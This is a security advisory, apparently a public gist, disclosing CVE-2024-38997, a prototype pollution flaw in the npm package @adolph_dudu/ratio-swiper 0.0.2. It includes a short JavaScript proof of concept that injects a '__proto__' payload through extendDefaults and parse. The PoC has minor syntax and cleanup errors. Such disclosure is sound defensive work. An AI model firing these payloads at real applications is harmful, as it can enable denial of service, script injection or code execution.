[CVE-2024-38997] Vulnerability Advisory: Prototype Pollution in @adolph\_dudu/ratio-swiper, version <= 0.0.2

 [Raw](/mestrtee/840f5d160aab4151bd0451cfb822e6b5/raw/1ace91a40b6b4254d78542aca3a7b058609b1eb4/Advisory_Adophlidu.md)

[**Advisory\_Adophlidu.md**](#file-advisory_adophlidu-md)

**Vulnerability type:**
Prototype Pollution

**SVSS Score**

6.5 MEDIUM

**Vendor of the Package:**
Adophlidu

**Affected Package:**

* Product: @adolph\_dudu/ratio-swiper
* Version: 0.0.2

**Affected component(s):**

```
extendDefaults, parse
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `extendDefaults, parse` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `extendDefaults, parse`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('@adolph_dudu/ratio-swiper');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.extendDefaults (JSON.parse('{"__proto__":{"test":123}}'))
lib.parse('{"__proto__":{"test":123}}'))

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.polluted;

  })();
```
